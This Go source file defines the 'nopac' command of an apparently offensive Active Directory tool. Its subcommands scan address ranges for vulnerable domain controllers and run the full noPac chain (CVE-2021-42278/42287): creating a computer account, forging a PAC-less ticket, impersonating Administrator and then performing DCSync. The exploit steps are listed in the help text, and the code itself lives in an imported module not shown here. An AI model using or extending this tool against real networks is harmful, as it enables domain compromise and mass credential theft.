package cmd

import (
	"adpack/modules"

	"github.com/spf13/cobra"
)

var (
	nopacDCIP, nopacDomain, nopacUser, nopacPass, nopacHash, nopacTargetUser, nopacDCHostname, nopacScanTarget string
)

var nopacCmd = &cobra.Command{
	Use:   "nopac",
	Short: "noPac (CVE-2021-42278/42287) — SAM account impersonation + PAC-less TGT",
	Long: `Exploit the noPac vulnerability chain (CVE-2021-42278 + CVE-2021-42287).

Attack chain:
  1. Create a computer account (requires MachineAccountQuota > 0)
  2. Clear the servicePrincipalName attribute
  3. Request a PAC-less TGT for the computer account
  4. Request a service ticket impersonating a Domain Admin
  5. DCSync using the forged ticket`,
}

var nopacCheckCmd = &cobra.Command{
	Use:   "check",
	Short: "Check if a DC is vulnerable to noPac",
	RunE: func(cmd *cobra.Command, args []string) error {
		return (&modules.NoPacManager{}).Check(nopacDCIP, nopacDomain, nopacUser, nopacPass)
	},
}

var nopacExploitCmd = &cobra.Command{
	Use:   "exploit",
	Short: "Exploit noPac — full attack chain",
	RunE: func(cmd *cobra.Command, args []string) error {
		return (&modules.NoPacManager{}).Exploit(nopacDCIP, nopacDomain, nopacUser, nopacPass, nopacHash, nopacTargetUser)
	},
}

var nopacDCSyncCmd = &cobra.Command{
	Use:   "dcsync",
	Short: "DCSync after successful noPac exploit",
	RunE: func(cmd *cobra.Command, args []string) error {
		return (&modules.NoPacManager{}).DCSyncAfterNoPac(nopacDCIP, nopacDomain, nopacDCHostname)
	},
}

var nopacScanCmd = &cobra.Command{
	Use:   "scan",
	Short: "Scan range for noPac-vulnerable DCs",
	RunE: func(cmd *cobra.Command, args []string) error {
		return (&modules.NoPacManager{}).Scan(nopacScanTarget)
	},
}

func init() {
	flags := nopacCmd.PersistentFlags()
	flags.StringVar(&nopacDCIP, "dc-ip", "", "Domain controller IP")
	flags.StringVar(&nopacDomain, "domain", "", "Domain")
	flags.StringVar(&nopacUser, "user", "", "Username")
	flags.StringVar(&nopacPass, "password", "", "Password")
	flags.StringVar(&nopacHash, "hashes", "", "NTLM hash")
	flags.StringVar(&nopacTargetUser, "target-user", "Administrator", "Target user to impersonate")
	flags.StringVar(&nopacDCHostname, "dc-hostname", "", "DC hostname for DCSync")
	flags.StringVar(&nopacScanTarget, "target", "", "Target CIDR or IP range for scan")

	nopacCmd.AddCommand(nopacCheckCmd, nopacExploitCmd, nopacDCSyncCmd, nopacScanCmd)
	rootCmd.AddCommand(nopacCmd)
}
